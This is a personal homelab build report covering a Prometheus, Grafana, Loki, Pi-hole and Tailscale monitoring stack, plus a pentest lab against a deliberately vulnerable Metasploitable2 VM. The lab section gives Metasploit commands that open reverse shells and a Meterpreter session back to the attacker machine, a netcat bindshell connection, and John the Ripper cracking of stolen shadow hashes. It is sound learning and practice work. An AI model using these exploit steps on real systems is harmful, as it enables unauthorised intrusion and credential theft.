# homelab-cybersec

# 🖥️ Homelab & Cybersecurity Lab — Build Report

> A documentation of my homelab journey — from setting up a monitoring stack on an old laptop to performing real penetration testing exploits in a personal cybersecurity lab.

---

## 📋 Table of Contents

- [Environment](#environment)
- [Homelab Stack](#homelab-stack)
  - [Pi-hole](#1-pi-hole)
  - [Node Exporter](#2-node-exporter)
  - [Prometheus](#3-prometheus)
  - [Grafana](#4-grafana)
  - [Loki & Promtail](#5-loki--promtail)
  - [Tailscale](#6-tailscale)
  - [Ollama & Open WebUI](#7-ollama--open-webui)
  - [cAdvisor](#8-cadvisor)
- [Cybersecurity Lab](#cybersecurity-lab)
  - [Lab Architecture](#lab-architecture)
  - [Reconnaissance](#reconnaissance)
  - [Exploits](#exploits)
  - [Password Cracking](#password-cracking)
- [Key Lessons Learned](#key-lessons-learned)
- [Architecture Overview](#architecture-overview)
- [Next Steps](#next-steps)

---

## Environment

| Component | Specs |
|---|---|
| **Server** | Old laptop — Intel i5-5300U, 4 cores @ 2.3GHz, 8GB RAM, 116GB SSD |
| **Attack Machine** | Personal laptop (Windows 11) — Kali Linux via VMware |
| **Target Machine** | PC — Ryzen 5600X, 16GB DDR4, RX 9060 XT — Metasploitable2 via VMware |
| **OS (Server)** | Ubuntu (Linux 6.8.0) |
| **Containerisation** | Docker + Docker Compose |

---

## Homelab Stack

### 1. Pi-hole

**Purpose:** Network-wide DNS-based ad and tracker blocking.

**Deployment:** Docker with `network_mode: host` to avoid DNS resolution issues inside the container.

```yaml
services:
  pihole:
    image: pihole/pihole:latest
    network_mode: "host"
    environment:
      DNS1: 1.1.1.1
      DNS2: 8.8.8.8
```

**Results:**
- 14,287 total DNS queries processed
- 2,061 queries blocked (14.4% block rate)
- 83,107 domains on blocklists

**Key issue resolved:** Container DNS was pointing to `127.0.0.53` which broke internal resolution. Fixed by switching to host networking and explicitly setting upstream DNS servers.

---

### 2. Node Exporter

**Purpose:** Expose host system metrics (CPU, RAM, disk, network) for Prometheus to scrape.

**Directory:** `~/monitoring/node-exporter`

```yaml
services:
  node-exporter:
    image: prom/node-exporter:latest
    ports:
      - "9100:9100"
    command:
      - '--path.rootfs=/host'
    pid: host
    volumes:
      - '/:/host:ro,rslave'
```

**Verified with:**
```bash
curl localhost:9100/metrics | head
```

---

### 3. Prometheus

**Purpose:** Metrics collection and storage. Scrapes Node Exporter and cAdvisor.

**Directory:** `~/monitoring/prometheus`

**Key issue resolved:** Using `localhost` as a scrape target failed due to Docker network namespace isolation. Fixed by using the actual LAN IP `192.168.0.182` as the target.

```yaml
scrape_configs:
  - job_name: "node"
    static_configs:
      - targets: ["192.168.0.182:9100"]

  - job_name: "cadvisor"
    static_configs:
      - targets: ["192.168.0.182:8081"]
```

**Access:** `http://192.168.0.182:9090`

---

### 4. Grafana

**Purpose:** Visualisation layer for metrics and logs. Connects to both Prometheus and Loki as datasources.

**Directory:** `~/monitoring/grafana`

**Dashboards imported:**
- Node Exporter Full (ID: 1860) — system metrics
- cAdvisor Exporter (ID: 14282) — container metrics
- Logs / App — Loki log viewer

**Access:** `http://192.168.0.182:3000`

**Key issue resolved:** Dashboard import via ID failed with "Bad Gateway" because Grafana couldn't reach grafana.com. Fixed by downloading the JSON manually and importing via the Grafana API using a Python script.

---

### 5. Loki & Promtail

**Purpose:** Log aggregation. Promtail collects logs from the host and Docker containers and ships them to Loki. Grafana queries Loki using LogQL.

**Directory:** `~/monitoring/loki`

**Log sources configured:**
- `/var/log/*log` — system logs (syslog, auth.log, kern.log, etc.)
- `/var/lib/docker/containers/*/*-json.log` — all Docker container logs

**Architecture:**
```
Promtail → Loki → Grafana
```

**Useful LogQL queries:**
```
{job="varlogs"}                          # All system logs
{job="varlogs"} |= "error"              # Filter errors
{job="varlogs", filename="/var/log/auth.log"} |= "Failed"   # SSH failures
{job="docker"}                          # All container logs
```

---

### 6. Tailscale

**Purpose:** Secure remote VPN access to the homelab from anywhere without port forwarding or exposing services to the internet.

**Installation:**
```bash
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
```

**Tailscale IP assigned:** `100.86.24.2`

All homelab services are now accessible remotely via the Tailscale IP:

| Service | URL |
|---|---|
| Grafana | `http://100.86.24.2:3000` |
| Prometheus | `http://100.86.24.2:9090` |
| Pi-hole | `http://100.86.24.2/admin` |
| Loki | `http://100.86.24.2:3100` |
| Open WebUI | `http://100.86.24.2:8080` |
| cAdvisor | `http://100.86.24.2:8081` |

---

### 7. Ollama & Open WebUI

**Purpose:** Run a private, local AI model on the homelab server. No data leaves the server.

**Directory:** `~/ai`

**Model used:** `phi3:mini` — lightweight, runs on CPU, fits within available RAM.

```yaml
services:
  ollama:
    image: ollama/ollama:latest
    ports:
      - "11434:11434"

  open-webui:
    image: ghcr.io/open-webui/open-webui:main
    ports:
      - "8080:8080"
    environment:
      - OLLAMA_BASE_URL=http://ollama:11434
```

**Use cases:**
- Log analysis assistant
- PromQL/LogQL query writing
- Docker and Linux config help
- General cybersecurity learning

**Access:** `http://192.168.0.182:8080`

**Note:** Running LLMs on CPU generates significant heat on older hardware. Recommended to start Ollama on-demand rather than keeping it running 24/7.

---

### 8. cAdvisor

**Purpose:** Expose per-container resource metrics (CPU, RAM, network I/O) to Prometheus.

**Directory:** `~/monitoring/cadvisor`

```yaml
services:
  cadvisor:
    image: gcr.io/cadvisor/cadvisor:latest
    ports:
      - "8081:8080"
    privileged: true
    volumes:
      - /:/rootfs:ro
      - /var/run:/var/run:ro
      - /sys:/sys:ro
      - /var/lib/docker/:/var/lib/docker:ro
```

**Architecture:**
```
cAdvisor → Prometheus → Grafana
```

---

## Cybersecurity Lab

### Lab Architecture

```
┌─────────────────────┐         ┌─────────────────────┐
│   Personal Laptop   │         │        PC           │
│   Kali Linux (VM)   │─attacks→│ Metasploitable2 (VM)│
│   192.168.0.158     │         │   192.168.0.189     │
└─────────────────────┘         └─────────────────────┘
           │                              │
           └──────────────┬───────────────┘
                          ↓
              ┌─────────────────────┐
              │    Old Laptop       │
              │  Monitoring Server  │
              │  Grafana/Loki/etc   │
              └─────────────────────┘
```

**Network mode:** Both VMs set to Bridged — allows cross-machine communication over the home network.

**Target machine:** Metasploitable2 — an intentionally vulnerable Linux VM designed for penetration testing practice.

---

### Reconnaissance

**Tool:** Nmap

```bash
nmap -sV 192.168.0.189
```

**Results — open ports discovered:**

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 80 | HTTP | Apache 2.2.8 |
| 139/445 | Samba | 3.X - 4.X |
| 1099 | Java RMI | GNU Classpath |
| 1524 | Bindshell | Root shell |
| 3306 | MySQL | 5.0.51a |
| 5432 | PostgreSQL | 8.3.0 |
| 5900 | VNC | Protocol 3.3 |
| 6667 | IRC | UnrealIRCd |
| 8180 | HTTP | Apache Tomcat |

---

### Exploits

#### Exploit 1 — Bindshell (Port 1524)

Port 1524 had an unauthenticated root shell listening — no exploit required, just a direct netcat connection.

```bash
nc 192.168.0.189 1524
whoami
# root
```

**Severity:** Critical — unauthenticated remote root access.

---

#### Exploit 2 — UnrealIRCd Backdoor (CVE-2010-2075)

UnrealIRCd 3.2.8.1 contained a backdoor secretly inserted into its source code by an attacker in 2009 — a real-world supply chain attack.

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.0.189
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.0.158
run
```

**Result:** Reverse shell obtained.

**Real-world parallel:** Similar supply chain attack concept to the SolarWinds hack (2020).

---

#### Exploit 3 — Samba Usermap Script (CVE-2007-2447)

A vulnerability in Samba's MS-RPC functionality allowed unauthenticated remote command execution.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.0.189
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.0.158
run
# whoami → root
```

**Severity:** Critical — unauthenticated remote root access via file sharing service.

---

#### Exploit 4 — Java RMI Server (Meterpreter)

Java RMI service exposed on port 1099 allowed code execution via a malicious RMI registry response.

```bash
use exploit/multi/misc/java_rmi_server
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.0.158
run
```

**Result:** Meterpreter session opened — providing encrypted in-memory shell with advanced post-exploitation capabilities.

---

### Password Cracking

**Tool:** John the Ripper  
**Wordlists:** rockyou.txt (14M passwords), custom wordlist

After obtaining `/etc/shadow` via shell access:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=custom.txt hashes.txt
john --show hashes.txt
```

**Results:**

| User | Password | Cracked by |
|---|---|---|
| msfadmin | msfadmin | Custom wordlist |
| user | user | Custom wordlist |
| postgres | postgres | Custom wordlist |
| service | service | rockyou.txt |
| root | toor | Custom wordlist |

**4 out of 5 hashes cracked** using simple wordlists. All cracked passwords were the username itself or its reverse — demonstrating critically weak password policy.

**Finding:** Weak password policy allows offline hash cracking in under 5 minutes.

---

## Key Lessons Learned

**Networking:**
- Docker bridge vs host vs NAT vs bridged networking and when to use each
- Why `localhost` inside containers refers to the container, not the host
- How DNS resolution breaks inside containers and how to fix it
- How Tailscale creates encrypted peer-to-peer tunnels without port forwarding

**Monitoring:**
- How metrics pipelines work: collector → storage → visualisation
- PromQL basics — `rate()`, labels, filtering
- LogQL basics — label filtering, string matching
- The difference between metrics (what's happening) and logs (what happened)

**Cybersecurity:**
- How Metasploit modules, payloads and sessions work
- Difference between a bindshell and a reverse shell
- What Meterpreter is and why it's preferred over a plain shell
- How password hashing works and why weak passwords are easily cracked
- Real CVEs and how supply chain attacks work
- Why wordlist choice matters in password cracking

---

## Architecture Overview

```
┌──────────────────────────────────────────────────┐
│                  Homelab Server                  │
│                                                  │
│  Node Exporter ──┐                               │
│  cAdvisor ───────┼──► Prometheus ──► Grafana     │
│                  │                      ▲         │
│  Promtail ───────────► Loki ────────────┘         │
│                                                  │
│  Pi-hole (DNS filtering)                         │
│  Tailscale (remote VPN access)                   │
│  Ollama + Open WebUI (local AI)                  │
└──────────────────────────────────────────────────┘
```

---

## Next Steps

- [ ] Add Wazuh SIEM for security alerting and threat detection
- [ ] Set up DVWA for web application penetration testing
- [ ] Practice privilege escalation techniques
- [ ] Try CTF challenges on HackTheBox / TryHackMe
- [ ] Migrate ELK SIEM from VMware to a dedicated machine
- [ ] Set up a reverse proxy (Nginx/Caddy) with local DNS
- [ ] Work toward OSCP certification

---

*Built and documented by Danish — a homelab and cybersecurity learning journey.*
